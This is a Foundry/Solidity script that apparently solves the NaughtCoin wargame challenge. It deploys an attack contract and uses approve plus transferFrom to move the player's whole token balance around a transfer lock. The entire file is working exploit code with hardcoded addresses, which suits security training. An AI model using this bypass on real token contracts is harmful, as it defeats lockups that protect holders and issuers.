// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Attack {
    INaughtCoin public token;
    address public player;

    constructor(address _token, address _player) {
        token = INaughtCoin(_token);
        player = _player;
    }

    function attack() public {
        uint256 balance = token.balanceOf(player);
        token.transferFrom(player, address(this), balance);
    }
}

contract NaughtCoinAttackScript is Script {
    address private constant NAUGHT_COIN_ADDRESS = 0xb23f374Eb589ADDE9Df9001FC0cEc7DcdB26eFfD;
    address private constant PLAYER_ADDRESS = 0x8fe205351ADE3b32245FFcBa2F58141Fa3B0a20F;

    function run() public {
        vm.startBroadcast();

        uint256 beforeBalance = getBalance(PLAYER_ADDRESS);
        console.log("before balance : %d", beforeBalance);

        Attack attack = new Attack(NAUGHT_COIN_ADDRESS, PLAYER_ADDRESS);
        INaughtCoin(NAUGHT_COIN_ADDRESS).approve(address(attack), beforeBalance);
        attack.attack();

        uint256 afterBalance = getBalance(PLAYER_ADDRESS);
        console.log("after balance : %d", afterBalance);

        vm.stopBroadcast();
    }

    function getBalance(address account) private view returns (uint256) {
        return INaughtCoin(NAUGHT_COIN_ADDRESS).balanceOf(account);
    }
}
